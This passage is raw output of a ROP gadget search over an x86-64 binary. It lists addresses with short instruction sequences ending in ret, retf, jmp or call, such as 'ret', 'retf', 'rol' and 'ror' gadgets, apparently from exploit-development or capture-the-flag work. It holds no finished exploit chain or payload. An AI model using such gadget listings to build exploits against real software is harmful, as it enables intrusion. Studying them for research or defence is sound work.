0x0000000000466ce9 : ret 0xf50
0x0000000000489816 : ret 0xf608
0x00000000004755e5 : ret 0xf631
0x00000000004266d6 : ret 0xf66
0x000000000047aef7 : ret 0xf675
0x000000000046ff4c : ret 0xf741
0x0000000000405912 : ret 0xf748
0x0000000000482b0c : ret 0xf749
0x0000000000425fd9 : ret 0xf800
0x000000000047b9fa : ret 0xf84a
0x00000000004a6ab0 : ret 0xf869
0x00000000004785fa : ret 0xf87e
0x0000000000419093 : ret 0xf8b
0x0000000000463831 : ret 0xf8c1
0x0000000000440eb6 : ret 0xf8c5
0x0000000000448d44 : ret 0xf8e9
0x0000000000475c5a : ret 0xf992
0x0000000000462c1a : ret 0xf9ef
0x00000000004948d4 : ret 0xfa17
0x0000000000494dcc : ret 0xfa3e
0x0000000000477b3a : ret 0xfa85
0x000000000041fc42 : ret 0xfae9
0x0000000000495a60 : ret 0xfb43
0x000000000042022a : ret 0xfbe9
0x0000000000425e99 : ret 0xfc00
0x000000000045f83a : ret 0xfc08
0x0000000000424db1 : ret 0xfc3
0x00000000004743ea : ret 0xfd83
0x000000000044e67a : ret 0xfddc
0x000000000044e17a : ret 0xfde1
0x0000000000425d59 : ret 0xfe00
0x0000000000400e45 : ret 0xfe83
0x0000000000423f5a : ret 0xfe9d
0x0000000000425c19 : ret 0xff00
0x00000000004353f1 : ret 0xff2
0x000000000044de9b : ret 0xff25
0x000000000042c919 : ret 0xff2d
0x000000000042667a : ret 0xff3
0x000000000046af27 : ret 0xff31
0x000000000041cb7a : ret 0xff3c
0x000000000041c27a : ret 0xff45
0x0000000000425ad9 : ret 0xff80
0x0000000000466501 : ret 0xff83
0x00000000004548cc : ret 0xff85
0x000000000045d572 : ret 0xffa0
0x0000000000423fba : ret 0xffa5
0x000000000040b16a : ret 0xffaf
0x000000000040ae6a : ret 0xffb2
0x0000000000411877 : ret 0xffb8
0x000000000040dcda : ret 0xffc0
0x0000000000423cc8 : ret 0xffdf
0x000000000045b450 : ret 0xffe0
0x000000000046d4e4 : ret 0xffe7
0x0000000000468199 : ret 0xffe8
0x0000000000449d85 : ret 0xffe9
0x000000000040f239 : ret 0xffef
0x00000000004236e2 : ret 0xfff
0x000000000040db02 : ret 0xfff0
0x000000000046a910 : ret 0xfff1
0x00000000004255d9 : ret 0xfff8
0x00000000004944b9 : ret 0xfff9
0x000000000041d198 : ret 0xfffa
0x00000000004048f9 : ret 0xfffb
0x0000000000425499 : ret 0xfffc
0x0000000000418b15 : ret 0xfffd
0x000000000041424b : ret 0xfffe
0x000000000041600c : ret 0xffff
0x0000000000403e18 : ret 1
0x000000000042c38b : ret 2
0x00000000004103ea : ret 3
0x0000000000409fc8 : ret 4
0x000000000045656a : ret 5
0x000000000049e968 : ret 6
0x000000000042b1da : ret 7
0x000000000040a028 : ret 8
0x0000000000445efa : ret 9
0x000000000047ea7f : retf
0x000000000040f542 : retf 0
0x0000000000458a22 : retf 0x10e8
0x000000000049f720 : retf 0x11
0x00000000004882bd : retf 0x114d
0x00000000004772f0 : retf 0x12b9
0x00000000004566ff : retf 0x12e9
0x0000000000462299 : retf 0x147f
0x0000000000472b43 : retf 0x148
0x000000000043375c : retf 0x14c
0x0000000000427ba2 : retf 0x16
0x000000000040a3f2 : retf 0x165
0x000000000040a2f2 : retf 0x166
0x00000000004844bd : retf 0x194d
0x000000000044c5f2 : retf 0x19b8
0x0000000000406cf2 : retf 0x19c
0x0000000000406bf2 : retf 0x19d
0x0000000000407174 : retf 0x1b
0x000000000040ecf1 : retf 0x1be
0x000000000041ec18 : retf 0x1be9
0x00000000004a12c8 : retf 0x1d4
0x00000000004a1a68 : retf 0x1d5
0x000000000042c040 : retf 0x1f0f
0x00000000004b075a : retf 0x2000
0x000000000046d701 : retf 0x20be
0x0000000000414d91 : retf 0x2148
0x000000000048f8a7 : retf 0x22
0x000000000041b973 : retf 0x2274
0x000000000048f5ca : retf 0x22cd
0x000000000047f932 : retf 0x23
0x0000000000401535 : retf 0x230
0x000000000046e81b : retf 0x24
0x000000000048604d : retf 0x24a
0x000000000045ff14 : retf 0x25
0x00000000004660fa : retf 0x2568
0x000000000045cde2 : retf 0x25f1
0x000000000044fef0 : retf 0x26
0x0000000000450896 : retf 0x26b5
0x000000000044fe82 : retf 0x26bf
0x000000000045033d : retf 0x26c4
0x000000000044ea4a : retf 0x26de
0x000000000042e6c9 : retf 0x280f
0x000000000041cd24 : retf 0x29
0x000000000047170a : retf 0x2941
0x0000000000409b6f : retf 0x2948
0x000000000041161e : retf 0x294c
0x00000000004200a2 : retf 0x29bc
0x0000000000418546 : retf 0x2a37
0x000000000041e388 : retf 0x2a74
0x000000000040f503 : retf 0x2a7e
0x00000000004a7cbc : retf 0x2a91
0x000000000040f86a : retf 0x2a95
0x00000000004796f4 : retf 0x2ac
0x0000000000403c92 : retf 0x2b7b
0x00000000004583df : retf 0x2c73
0x00000000004583b9 : retf 0x2c76
0x00000000004a713a : retf 0x2c90
0x00000000004768d3 : retf 0x2d9
0x0000000000477f9f : retf 0x2de9
0x000000000044cd81 : retf 0x2e75
0x00000000004014f8 : retf 0x31
0x0000000000434fe6 : retf 0x3148
0x00000000004a8f25 : retf 0x3159
0x00000000004a8f8d : retf 0x32dd
0x00000000004a07c8 : retf 0x33
0x00000000004a7843 : retf 0x33e6
0x00000000004a7d71 : retf 0x3617
0x0000000000434fc2 : retf 0x377
0x000000000041ef20 : retf 0x3948
0x0000000000471470 : retf 0x3949
0x0000000000419c3a : retf 0x394c
0x000000000045ab62 : retf 0x3c9
0x000000000041ffad : retf 0x3d83
0x00000000004a9386 : retf 0x3d8a
0x00000000004a6c1b : retf 0x3ec
0x000000000044def5 : retf 0x4102
0x000000000044e041 : retf 0x4110
0x00000000004543fe : retf 0x4180
0x000000000042672c : retf 0x4266
0x0000000000454163 : retf 0x4280
0x000000000048a24d : retf 0x42f6
0x0000000000400ec2 : retf 0x440
0x000000000043d84a : retf 0x4466
0x00000000004656d6 : retf 0x45e9
0x0000000000454b64 : retf 0x4689
0x0000000000419cf5 : retf 0x4801
0x0000000000417981 : retf 0x4802
0x000000000040d90c : retf 0x4805
0x000000000040d977 : retf 0x4806
0x0000000000471a57 : retf 0x4808
0x000000000040d828 : retf 0x4809
0x000000000040da68 : retf 0x480a
0x000000000040da2c : retf 0x480d
0x0000000000411533 : retf 0x4810
0x0000000000411631 : retf 0x4820
0x0000000000482b86 : retf 0x48f8
0x000000000041d703 : retf 0x4901
0x000000000045a253 : retf 0x4a8d
0x000000000041e35a : retf 0x4b74
0x0000000000417933 : retf 0x4c01
0x00000000004238a2 : retf 0x4c89
0x00000000004897a9 : retf 0x4d20
0x0000000000484488 : retf 0x4de8
0x0000000000482a8b : retf 0x4df0
0x00000000004844ac : retf 0x4df8
0x000000000041ebe2 : retf 0x51e9
0x00000000004667c6 : retf 0x53c
0x0000000000485392 : retf 0x557f
0x000000000048af06 : retf 0x5774
0x00000000004851cd : retf 0x5d5b
0x0000000000479f35 : retf 0x5f6
0x000000000040e9bc : retf 0x6411
0x00000000004001c3 : retf 0x6500
0x000000000042e7b3 : retf 0x6601
0x000000000042e903 : retf 0x6602
0x000000000042ea53 : retf 0x6603
0x000000000042eba3 : retf 0x6604
0x000000000042ecf3 : retf 0x6605
0x000000000042ee43 : retf 0x6606
0x000000000042ef93 : retf 0x6607
0x000000000042f0e3 : retf 0x6608
0x000000000042f233 : retf 0x6609
0x000000000042f383 : retf 0x660a
0x000000000042f4d3 : retf 0x660b
0x000000000042f623 : retf 0x660c
0x000000000042f773 : retf 0x660d
0x000000000042f8c3 : retf 0x660e
0x000000000042fa13 : retf 0x660f
0x0000000000434fe1 : retf 0x676
0x00000000004a92a5 : retf 0x67ca
0x0000000000475711 : retf 0x6b8
0x00000000004a72a2 : retf 0x6ee8
0x0000000000423d72 : retf 0x700
0x00000000004a9166 : retf 0x7272
0x00000000004a893f : retf 0x76a5
0x0000000000411b33 : retf 0x775
0x00000000004a77c2 : retf 0x79f5
0x000000000044a66b : retf 0x8041
0x000000000042bf73 : retf 0x8148
0x000000000041e832 : retf 0x820f
0x00000000004111e0 : retf 0x830f
0x0000000000414541 : retf 0x8310
0x000000000041352d : retf 0x8320
0x0000000000454f67 : retf 0x8341
0x0000000000419cf2 : retf 0x8348
0x000000000042abef : retf 0x8349
0x000000000040f7d2 : retf 0x836
0x000000000041a1d0 : retf 0x840f
0x00000000004a80b0 : retf 0x8481
0x0000000000414f46 : retf 0x850f
0x00000000004008c3 : retf 0x8545
0x0000000000441a7b : retf 0x8548
0x000000000042ba99 : retf 0x860f
0x00000000004337ac : retf 0x870f
0x0000000000489850 : retf 0x8820
0x000000000045414d : retf 0x8880
0x00000000004238a8 : retf 0x8902
0x00000000004014b4 : retf 0x8904
0x0000000000412570 : retf 0x8920
0x000000000044aeaa : retf 0x8940
0x0000000000404016 : retf 0x8941
0x00000000004604b0 : retf 0x8944
0x0000000000402f63 : retf 0x8948
0x000000000042e1e9 : retf 0x8949
0x00000000004114dc : retf 0x894c
0x000000000045625a : retf 0x8966
0x00000000004541ae : retf 0x8980
0x0000000000485882 : retf 0x8b41
0x000000000040494b : retf 0x8b48
0x00000000004057cc : retf 0x8b49
0x00000000004305e9 : retf 0x8b4c
0x000000000041a20e : retf 0x8d48
0x000000000042b9a9 : retf 0x8d4a
0x0000000000444fed : retf 0x8d4c
0x000000000041ec2b : retf 0x8e9
0x000000000042ab2d : retf 0x9066
0x000000000040466c : retf 0x912
0x000000000045acc0 : retf 0x9273
0x00000000004a8a0e : retf 0x93a2
0x000000000041e6e6 : retf 0x948
0x000000000046cf3c : retf 0x98e9
0x00000000004a8dab : retf 0x99e0
0x000000000044aea0 : retf 0x9b9
0x00000000004a911a : retf 0x9d7d
0x00000000004a9a25 : retf 0xa020
0x00000000004a6f85 : retf 0xa1eb
0x00000000004a900b : retf 0xa2fe
0x000000000041d9f9 : retf 0xa74
0x00000000004a90dc : retf 0xab0d
0x000000000040e7ed : retf 0xade9
0x00000000004a962e : retf 0xae32
0x0000000000426e52 : retf 0xb
0x0000000000458b82 : retf 0xb0e8
0x000000000041e981 : retf 0xb2e9
0x00000000004a7e29 : retf 0xb51a
0x000000000042c5d2 : retf 0xb60f
0x000000000048ade2 : retf 0xb801
0x0000000000454f74 : retf 0xb941
0x0000000000487d80 : retf 0xba
0x000000000041d731 : retf 0xba41
0x000000000046f102 : retf 0xbb41
0x00000000004a9133 : retf 0xbb9a
0x0000000000485a36 : retf 0xbeb
0x00000000004a917d : retf 0xbf4b
0x0000000000402732 : retf 0xbfd8
0x000000000046d65c : retf 0xc
0x00000000004570c8 : retf 0xc031
0x00000000004026e3 : retf 0xc089
0x00000000004a8dfd : retf 0xc0fe
0x000000000040e17a : retf 0xc148
0x00000000004734be : retf 0xc149
0x0000000000460dd5 : retf 0xc239
0x00000000004649d2 : retf 0xc4
0x000000000045951d : retf 0xc6
0x0000000000465651 : retf 0xc7
0x0000000000424644 : retf 0xc748
0x0000000000473773 : retf 0xc985
0x000000000042db24 : retf 0xcab2
0x00000000004a63ca : retf 0xcccb
0x000000000040aaa7 : retf 0xd
0x00000000004a7be6 : retf 0xd1cb
0x0000000000448b0f : retf 0xd231
0x00000000004155f5 : retf 0xd284
0x0000000000451a34 : retf 0xd285
0x0000000000404021 : retf 0xd289
0x00000000004a92f7 : retf 0xd39
0x0000000000448906 : retf 0xd975
0x00000000004a9883 : retf 0xde4f
0x0000000000412b11 : retf 0xdeb
0x00000000004a7eb3 : retf 0xdf7f
0x00000000004070f6 : retf 0xe
0x00000000004a795e : retf 0xe152
0x0000000000448743 : retf 0xe175
0x0000000000485a5b : retf 0xe275
0x0000000000454c80 : retf 0xe283
0x00000000004789e9 : retf 0xe474
0x00000000004485dc : retf 0xe475
0x00000000004a7f3c : retf 0xe496
0x000000000045e157 : retf 0xe677
0x00000000004a78a6 : retf 0xe72e
0x00000000004a6f33 : retf 0xe80
0x000000000047785b : retf 0xe802
0x00000000004658c5 : retf 0xe87f
0x000000000040d9a9 : retf 0xe903
0x000000000048417c : retf 0xe972
0x00000000004612d5 : retf 0xe9ff
0x0000000000483acb : retf 0xea72
0x00000000004129d3 : retf 0xea77
0x00000000004a8eec : retf 0xea91
0x000000000048813b : retf 0xeac0
0x000000000041bc82 : retf 0xeac1
0x0000000000425271 : retf 0xead3
0x000000000040d962 : retf 0xeb04
0x000000000040d9c1 : retf 0xeb07
0x000000000040d888 : retf 0xeb08
0x000000000040da8f : retf 0xeb0b
0x000000000040da62 : retf 0xeb0c
0x00000000004a700d : retf 0xeb83
0x00000000004a9801 : retf 0xebbf
0x000000000041787b : retf 0xee75
0x000000000047e367 : retf 0xee7c
0x00000000004339ec : retf 0xf01
0x0000000000433b6c : retf 0xf02
0x0000000000433cec : retf 0xf03
0x0000000000433e6c : retf 0xf04
0x0000000000433fec : retf 0xf05
0x000000000043416c : retf 0xf06
0x00000000004342ec : retf 0xf07
0x000000000043446c : retf 0xf08
0x00000000004345ec : retf 0xf09
0x000000000043476c : retf 0xf0a
0x00000000004348ec : retf 0xf0b
0x0000000000434a6c : retf 0xf0c
0x0000000000434bec : retf 0xf0d
0x0000000000434d6c : retf 0xf0e
0x0000000000434eec : retf 0xf0f
0x000000000043f41d : retf 0xf1c5
0x000000000045dbdb : retf 0xf41
0x00000000004413e0 : retf 0xf48
0x00000000004739a1 : retf 0xf4c
0x00000000004b3e80 : retf 0xf4c6
0x0000000000472b46 : retf 0xf631
0x00000000004a8e48 : retf 0xf64
0x0000000000425153 : retf 0xf66
0x00000000004928f8 : retf 0xf6fa
0x000000000042cb8a : retf 0xf748
0x0000000000487812 : retf 0xf7a3
0x00000000004727f2 : retf 0xf8dc
0x000000000041df5d : retf 0xf989
0x000000000043f4ef : retf 0xf9c5
0x00000000004950f0 : retf 0xfa30
0x00000000004950e8 : retf 0xfa31
0x00000000004950e0 : retf 0xfa32
0x00000000004950d8 : retf 0xfa33
0x00000000004950d0 : retf 0xfa34
0x0000000000494ef8 : retf 0xfa39
0x0000000000404041 : retf 0xfa83
0x0000000000457312 : retf 0xfaa8
0x0000000000475132 : retf 0xfaaf
0x00000000004637ca : retf 0xfac1
0x0000000000468af2 : retf 0xfb7e
0x0000000000458cf2 : retf 0xfc7c
0x0000000000490c92 : retf 0xfca1
0x00000000004728e2 : retf 0xfd9e
0x0000000000473646 : retf 0xfdc5
0x00000000004ab884 : retf 0xfe0f
0x000000000048267b : retf 0xfe8
0x000000000042c9b7 : retf 0xfec5
0x0000000000435811 : retf 0xff2
0x000000000042cfbb : retf 0xff3
0x000000000040dc34 : retf 0xff31
0x000000000041b0d2 : retf 0xff51
0x0000000000489982 : retf 0xff8c
0x000000000046db02 : retf 0xffde
0x000000000040b989 : retf 0xffe7
0x00000000004874b2 : retf 0xfff3
0x000000000046497a : retf 0xfff5
0x0000000000454247 : retf 0xfff6
0x00000000004851e7 : retf 0xfff7
0x000000000045e772 : retf 0xfff8
0x000000000048e552 : retf 0xfff9
0x0000000000454ebe : retf 0xfffa
0x0000000000465a2f : retf 0xfffb
0x000000000040e2d1 : retf 0xfffc
0x000000000044d2da : retf 0xfffd
0x00000000004119be : retf 0xfffe
0x00000000004039d5 : retf 0xffff
0x0000000000423882 : retf 1
0x0000000000427752 : retf 2
0x0000000000453992 : retf 3
0x00000000004489c4 : retf 4
0x00000000004a2e74 : retf 5
0x0000000000409eba : retf 6
0x00000000004a3274 : retf 7
0x00000000004a3474 : retf 8
0x000000000042ccdb : retf 9
0x0000000000494780 : rol ah, 1 ; stc ; call qword ptr [rax]
0x00000000004944d4 : rol al, 0xf9 ; inc eax ; ret 0xfff9
0x0000000000447015 : rol bl, 0x48 ; mov eax, edi ; ret
0x0000000000448b03 : rol bl, 0x48 ; mov eax, edx ; pop rbx ; ret
0x000000000048e21c : rol bl, 0x66 ; nop ; mov rax, qword ptr [rsi + 8] ; ret
0x000000000042bc6e : rol bl, 0x83 ; ret 0x6620
0x000000000047475b : rol bl, 0xb8 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x0000000000418c77 : rol bl, 1 ; mov eax, 0xffffffff ; ret
0x000000000042c43d : rol bl, 1 ; nop ; xor eax, eax ; ret
0x00000000004479bd : rol byte ptr [r9 + 0xf], 1 ; adc dword ptr [rbx], esp ; ret
0x0000000000426652 : rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x000000000042c15b : rol byte ptr [rax + 0x48], 1 ; clc ; vzeroupper ; ret
0x0000000000473932 : rol byte ptr [rax + 0x49], 0x39 ; ret 0x2774
0x00000000004a2c60 : rol byte ptr [rax + rax], 0 ; ret 4
0x0000000000479e11 : rol byte ptr [rax], 0 ; add byte ptr [rcx - 0x77], cl ; ret 0x848b
0x000000000042cead : rol byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000044d7ab : rol byte ptr [rax], 0 ; add dh, dh ; ret 0x7404
0x000000000048d24e : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; add rsp, 0x18 ; ret
0x0000000000410409 : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000042beb2 : rol byte ptr [rbp + 0x664975c0], 0xf ; xlatb ; ret 0xc085
0x0000000000485a55 : rol byte ptr [rbx + 0x394800d3], 1 ; retf 0xe275
0x000000000048286b : rol byte ptr [rbx - 0x177cfd20], 1 ; ret
0x00000000004190e8 : rol byte ptr [rbx - 0x6af00002], 0xc0 ; neg eax ; ret
0x00000000004539e1 : rol byte ptr [rbx - 0x76befb08], 1 ; ret 0x415f
0x00000000004749c2 : rol byte ptr [rbx], 0 ; add byte ptr [rax], al ; ret
0x0000000000448991 : rol byte ptr [rcx + 0xbeff], cl ; add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x000000000046674f : rol byte ptr [rcx + 0xf], 0x94 ; ret
0x00000000004479be : rol byte ptr [rcx + 0xf], 1 ; adc dword ptr [rbx], esp ; ret
0x00000000004008be : rol byte ptr [rcx + rcx*4 - 0x3e], 0x21 ; retf 0x8545
0x000000000046d402 : rol byte ptr [rcx - 0x77], 1 ; ret 0xb9e9
0x00000000004749a2 : rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; ret
0x00000000004647d2 : rol byte ptr [rcx], 0x39 ; retf
0x000000000044f146 : rol byte ptr [rcx], 0x50 ; call rbx
0x0000000000459c9b : rol byte ptr [rcx], 0x83 ; ret 0x4801
0x0000000000448d27 : rol byte ptr [rcx], 0x83 ; ret 0xf01
0x0000000000448d40 : rol byte ptr [rcx], 0xf ; scasd eax, dword ptr [rdi] ; ret 0xf8e9
0x00000000004241ab : rol byte ptr [rcx], 1 ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000044e991 : rol byte ptr [rcx], 1 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000402eac : rol byte ptr [rcx], cl ; add byte ptr [rax - 0x77], cl ; ret 0x7ce9
0x0000000000474a02 : rol byte ptr [rdi], 0 ; add byte ptr [rax], al ; ret
0x0000000000477c3c : rol byte ptr [rdx + rdi*8 - 0x3f7ab701], 0x74 ; retf
0x0000000000495230 : rol byte ptr [rdx + rdi*8 - 1], 0xd0 ; cli ; jmp rax
0x00000000004749b2 : rol byte ptr [rdx], 0 ; add byte ptr [rax], al ; ret
0x000000000048be86 : rol byte ptr [rdx], 0xe9 ; retf 0xfffc
0x00000000004afc2c : rol byte ptr [rdx], 1 ; add al, dh ; mov cl, bh ; call qword ptr [rax]
0x0000000000495234 : rol byte ptr [rsi - 6], 1 ; jmp rax
0x00000000004749f2 : rol byte ptr [rsi], 0 ; add byte ptr [rax], al ; ret
0x000000000043f5d5 : rol ch, 1 ; jns 0x43f5b4 ; retf 0xead3
0x000000000043f725 : rol ch, 1 ; jns 0x43f704 ; retf 0xead3
0x000000000043f875 : rol ch, 1 ; jns 0x43f854 ; retf 0xead3
0x000000000043f9c5 : rol ch, 1 ; jns 0x43f9a4 ; retf 0xead3
0x000000000043fb15 : rol ch, 1 ; jns 0x43faf4 ; retf 0xead3
0x000000000043fc65 : rol ch, 1 ; jns 0x43fc44 ; retf 0xead3
0x000000000043fdb5 : rol ch, 1 ; jns 0x43fd94 ; retf 0xead3
0x000000000043ff05 : rol ch, 1 ; jns 0x43fee4 ; retf 0xead3
0x0000000000440055 : rol ch, 1 ; jns 0x440034 ; retf 0xead3
0x00000000004401a5 : rol ch, 1 ; jns 0x440184 ; retf 0xead3
0x00000000004402f5 : rol ch, 1 ; jns 0x4402d4 ; retf 0xead3
0x0000000000440445 : rol ch, 1 ; jns 0x440424 ; retf 0xead3
0x0000000000440595 : rol ch, 1 ; jns 0x440574 ; retf 0xead3
0x00000000004406e5 : rol ch, 1 ; jns 0x4406c4 ; retf 0xead3
0x0000000000440835 : rol ch, 1 ; jns 0x440814 ; retf 0xead3
0x000000000042c1df : rol ch, 1 ; std ; xlatb ; ret
0x00000000004736a6 : rol ch, cl ; std ; xlatb ; ret
0x000000000044154f : rol ch, cl ; std ; xlatb ; ret 0xc085
0x00000000004a63c0 : rol cl, 0xc2 ; ret
0x000000000047494c : rol dword ptr [rax + 0x1e740fe1], 1 ; ret
0x000000000044873c : rol dword ptr [rax + 0x48000000], 0x39 ; retf 0xe175
0x00000000004485d8 : rol dword ptr [rax + 0x48], 0x39 ; retf 0xe475
0x0000000000437ab0 : rol dword ptr [rax], 0 ; add byte ptr [rax + 0x39], cl ; retf 0x377
0x0000000000400b59 : rol dword ptr [rax], cl ; add dword ptr [rax], eax ; nop ; pop rbp ; ret
0x000000000042bc94 : rol dword ptr [rbp + 0x315775c0], 0xc0 ; ret
0x000000000042c1d3 : rol dword ptr [rbp - 0x3a378a40], 0xfd ; xlatb ; ret 0xc085
0x0000000000441023 : rol dword ptr [rbp - 0x3a678a40], 0xfd ; xlatb ; ret 0xc085
0x00000000004780c9 : rol dword ptr [rcx], 0 ; add byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x7d] ; ret
0x0000000000400929 : rol dword ptr [rcx], 0x8d ; call r11
0x000000000045718f : rol dword ptr [rcx], 0xf ; mov dh, 0x41 ; dec dword ptr [rax - 0x7d] ; ret 0x8801
0x00000000004b0756 : rol dword ptr [rdx + 0xe], 8 ; retf 0x2000
0x000000000045524a : rol dword ptr [rdx], 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000047363e : rol ebp, 1 ; fnsave dword ptr [rcx + rbx*8 - 0x3b] ; std ; xlatb ; retf 0xfdc5
0x000000000042c915 : rol ebp, 1 ; stc ; xlatb ; ret 0xff2d
0x00000000004236ac : rol ebx, 0x66 ; nop ; xor eax, eax ; ret
0x00000000004236ab : rol r11d, 0x66 ; nop ; xor eax, eax ; ret
0x0000000000472355 : ror byte ptr [r9 + rcx*4 - 1], 0x41 ; call rsp
0x000000000048aab8 : ror byte ptr [rax + 0x21], cl ; ret 0xc148
0x000000000042bce2 : ror byte ptr [rax + 0x29], 0xc2 ; jbe 0x42bd29 ; add rax, rdi ; ret
0x00000000004413e7 : ror byte ptr [rax + 0x29], 1 ; clc ; ret
0x000000000047466c : ror byte ptr [rax + 0x29], 1 ; clc ; shr rax, 2 ; ret
0x0000000000411a2e : ror byte ptr [rax + 0x29], 1 ; ret
0x0000000000475a3c : ror byte ptr [rax + 0x39], 0xd7 ; ja 0x475a6f ; ret
0x000000000044c688 : ror byte ptr [rax + 0x39], 0xfa ; setae al ; ret
0x000000000041e533 : ror byte ptr [rax + 0x39], 1 ; ret
0x0000000000482d21 : ror byte ptr [rax + 0x39], cl ; call 0x490abf3e
0x000000000047c99a : ror byte ptr [rax + 0x39], cl ; ret
0x00000000004700e3 : ror byte ptr [rax + 0x39], cl ; ret 0xf48
0x000000000041d4df : ror byte ptr [rax + 0x3b], 5 ; pop rcx ; ret
0x000000000044de4d : ror byte ptr [rax + 0x63], cl ; test dword ptr [rax], r8d ; add rax, rbp ; jmp rax
0x000000000047e8c6 : ror byte ptr [rax + 0xf], 0x44 ; enter -0x76b8, -0x38 ; ret
0x000000000045f5db : ror byte ptr [rax + 0xf], 0x44 ; ret 0xae9
0x000000000045b379 : ror byte ptr [rax + 0xf], 1 ; ret 0x3949
0x000000000045b36a : ror byte ptr [rax + 0xf], 1 ; ret 0x8b41
0x000000000042bd8c : ror byte ptr [rax + 1], 0xf8 ; add rax, rcx ; ret
0x000000000042bcb2 : ror byte ptr [rax + 1], 0xf8 ; ret
0x000000000042c1a3 : ror byte ptr [rax + 1], 0xf8 ; vzeroupper ; ret
0x0000000000405a63 : ror byte ptr [rax + 1], 1 ; ret
0x00000000004413e4 : ror byte ptr [rax + 1], cl ; ror byte ptr [rax + 0x29], 1 ; clc ; ret
0x000000000049f068 : ror byte ptr [rax + rax], 0 ; ret
0x000000000042c435 : ror byte ptr [rax - 0x2d], 0xfa ; movzx edx, dl ; sub eax, edx ; ret
0x000000000048333c : ror byte ptr [rax - 0x3f], 0xe0 ; add ecx, dword ptr [rbp - 0x77] ; ret 0x8d48
0x00000000004664fa : ror byte ptr [rax - 0x3f], 0xe2 ; and byte ptr [rax + 9], cl ; ret 0xff83
0x000000000042bca2 : ror byte ptr [rax - 0x73], 0x44 ; cmp al, dh ; ret
0x000000000042bcd2 : ror byte ptr [rax - 0x73], 0x44 ; cmp byte ptr [rax], ah ; ret
0x000000000042bcc2 : ror byte ptr [rax - 0x73], 0x44 ; cmp byte ptr [rax], dl ; ret
0x00000000004236de : ror byte ptr [rax - 0x73], 0x44 ; ret 0xfff
0x0000000000479a9a : ror byte ptr [rax - 0x73], cl ; add dword ptr [r15], r9d ; xchg eax, ebp ; ret 0xc283
0x000000000044a17a : ror byte ptr [rax - 0x77], 0xee ; mov edi, ebx ; xor eax, eax ; syscall
0x0000000000411c70 : ror byte ptr [rax - 0x77], 1 ; ret
0x000000000048aacd : ror byte ptr [rax - 0x77], 1 ; ret 0x3575
0x000000000045ab84 : ror byte ptr [rax - 0x77], 1 ; ret 0x894c
0x00000000004143f0 : ror byte ptr [rax - 0x77], 1 ; ret 0x8b48
0x000000000048203a : ror byte ptr [rax - 0x77], 1 ; ret 0xc148
0x000000000040dbbd : ror byte ptr [rax - 0x77], 1 ; ret 0xe281
0x000000000041fd2d : ror byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x00000000004150d1 : ror byte ptr [rax - 0x7b], 0xd2 ; jne 0x4150e7 ; ret
0x0000000000484dac : ror byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x94 ; ret 0x950f
0x0000000000416e55 : ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x0000000000475953 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
0x0000000000416071 : ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x000000000041e67d : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cb2e9c
0x000000000041f7bd : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cb3fdc
0x0000000000420577 : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cb4d96
0x000000000042207a : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cb6899
0x000000000042257f : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cb6d9e
0x0000000000422abb : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cb72da
0x000000000040ec60 : ror byte ptr [rax - 0x7d], 1 ; ret 0x4801
0x000000000044b2c4 : ror byte ptr [rax - 0x7d], 1 ; retf 0x4901
0x0000000000412b0a : ror byte ptr [rax - 0x7d], cl ; loop 0x412b12 ; add rdx, rcx ; jmp 0x412b28
0x0000000000455885 : ror byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004896a5 : ror byte ptr [rax], 0x83 ; ret 0x3901
0x0000000000494a40 : ror byte ptr [rax], 1 ; cli ; call qword ptr [rax + 0x10fffa10]
0x000000000046ec02 : ror byte ptr [rbp + 0x39441604], cl ; retf 0xf41
0x000000000046f122 : ror byte ptr [rbp + 0x39441704], cl ; ret 0xf49
0x000000000047403c : ror byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x20 ; call rbx
0x000000000044d8fb : ror byte ptr [rbx + 0xf480004], 0x44 ; ret
0x00000000004847a4 : ror byte ptr [rcx + 0x2b802], 1 ; add byte ptr [rax], al ; ret
0x000000000048c197 : ror byte ptr [rcx + 0x63], 4 ; test byte ptr [rcx + rax - 0x20], cl ; jmp rax
0x0000000000472356 : ror byte ptr [rcx + rcx*4 - 1], 0x41 ; call rsp
0x000000000045c886 : ror byte ptr [rcx - 0x73], 0x43 ; adc byte ptr [rdi], cl ; sahf ; ret 0x894c
0x00000000004681e8 : ror byte ptr [rcx - 0x77], cl ; ret
0x000000000045015f : ror byte ptr [rcx - 0x7d], cl ; cmp al, 0x24 ; add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd5e9
0x00000000004697fe : ror byte ptr [rcx - 0x90f4b], 0xff ; jmp qword ptr [rdx + rax*8]
0x000000000046ff44 : ror byte ptr [rcx - 9], cl ; cmc ; mov rbp, rax ; jmp 0x46ff17
0x000000000045b622 : ror byte ptr [rdi], 0 ; add byte ptr [rax], al ; syscall
0x000000000044c57c : ror byte ptr [rdi], 0x44 ; ret 0x66c3
0x0000000000478071 : ror byte ptr [rdi], 0x84 ; clc ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000045ebdc : ror byte ptr [rdi], 0x84 ; lahf ; or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
